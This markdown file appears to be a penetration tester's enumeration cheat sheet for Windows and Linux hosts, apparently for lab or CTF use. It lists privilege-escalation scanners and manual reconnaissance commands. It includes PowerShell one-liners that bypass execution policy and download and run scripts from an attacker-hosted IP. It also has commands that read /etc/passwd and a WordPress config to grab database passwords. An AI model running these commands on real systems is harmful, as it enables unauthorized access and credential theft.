## Enumeration

Run these scripts to quickly pilfer some info

### Windows

#### First steps

1. Always check your current user

   ```powershell
   whoami
   net user <username>
   whoami /groups
   whoami /priv
   ```

#### Automated

1. WinPEAS.exe (Requires some .net framework to be installed)

   ```bash
   # PS Command
   .\winPEAS | Out-File -Encoding ASCII winpeas.txt
   # CMD prompt
   winPEAS > winpeas.txt
   # OR
   powershell -c ".\winPEAS | Out-File -Encoding ASCII winpeas.txt"
   ```

2. PowerUp (From PowerSploit, requires Powershell)

   ```powershell
   # Running Locally
   powershell.exe -nop -exec bypass
   Import-Module .\PowerUp.ps1
   # Run all relevant checks and dump to a file
   Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
   
   # Running Locally (one-liner)
   powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks | Out-File -Encoding ASCII checks.txt}"
   
   # Running Remotely
   powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.37/PowerUp.ps1') ; Invoke-AllChecks | Out-File -Encoding ASCII checks.txt"
   
   # Running Remotely & bypassing execution policy
   powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.37/powerup.ps1') ; Invoke-AllChecks"
   ```
   
3. Sherlock.ps1 (Deprecated)

   ```powershell
   # Running Remotely
   powershell.exe "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.37/Sherlock.ps1') ; Find-AllVulns"
   
   # Running Locally
   powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
   
   # One page suggested running this from the cmd prompt to get the right Powershell version.  I think it doesn't work with -Command though, so I just removed that.
   @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Sherlock.ps1'))"
   ```
   
#### Manual Commands (Newer Ver):

```powershell
echo "*********************User Info*********************"
whoami
echo %username%
whoami /groups
whoami /priv
# User ernumeration
net user
net user %username%
net localgroup
net localgroup %groupname%

echo "*********************System Info*********************"
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
# You can also check the files below for Windows versions
type C:\Windows\System32\License.rtf
# For older Windows
type C:\Windows\System32\eula.txt

echo "*********************File Info*********************"
# Builds a tree-format listing of files
tree /f /a

echo "********************Network Info*********************"
netstat -ano
arp -a
ipconfig /all
# Firewall Rules
# Show current FW profile
netsh advfirewall show currentprofile

# Show all firewall rules
netsh advfirewall firewall show rule name=all

echo "*********************Task Info*********************"
# Scheduled Tasks
## Short ver
schtasks /query
## Long ver
schtasks /query /fo LIST /v

# Show running processes
tasklist /SVC
```

#### Manual Commands Windows (Older Ver)

```powershell
# Show firewall rules
netsh firewall show state
```

#### Domain Commands

```powershell
# Enumerate all local accounts
net user
# Enumerate all users in the domain
net user /domain
# Enumerate a specific user (ex. jeff_admin)
net user jeff_admin /domain
# Enumerate domain groups
net group /domain
```

### Linux

#### Automated

1. LinPEAS (/home/coyote/opt/enumeration/linux/linPEAS)

   ```bash
   # Kick off script
   ./linpeas.sh > linpeas.txt
   
   # View with
   less -r linpeas.txt
   ```

2. LinEnum (/home/coyote/opt/enumeration/linux/LinEnum)

   ```bash
   # Kick off script
   ./LinEnum.sh > linenum.txt
   ```

3. Bashark (/home/coyote/opt/enumeration/linux/Bashark)

   ```bash
   ./bashark.sh
   # Puts you into an interactive menu, doesn't always work
   ```

#### Processes

1. Use `pspy` to enumerate process that run periodically to catch scripts and hidden commands.
   BE SURE TO MAKE A NEW SHELL FOR THIS BECAUSE YOU CAN'T EXIT FROM IT, but you can kill it from the other shell.
   
   ```bash
   # This command will dump a ton of processes, so you will likely want to filter it.
   pspy64
   # You can use this with exactly one grep as well (stacking greps will not allow the output to show up), to find root commands containing python references, for instance.  I tried to background this, but it seemed to just catch the initial output and then nothing else after that.
   ./pspy64 | grep -E 'UID=0.*py'
   ```

#### Other Manual enumeration:

```bash
# User Info
id
cat /etc/passwd
sudo -l

# System Info
hostname
cat /etc/*release
uname -a
arch
env

# Network Info
ip a
ifconfig
route
routel
netstat -antpu
sockstat -l	# FreeBSD

# Process Info
ss -anp
ps aux
ls -lah /etc/cron*

cat /etc/crontab
# Writable Files
find / -writable -type f 2>/dev/null

# Files owned by a certain group
find / -group GROUP_NAME 2>/dev/null

# SUID/SGID
find / -perm -u=s -type f 2>/dev/null
```

#### Grab WordPress passwords

```bash
# Get DB username/password
cat /var/www/html/wp/wp-config.php
```

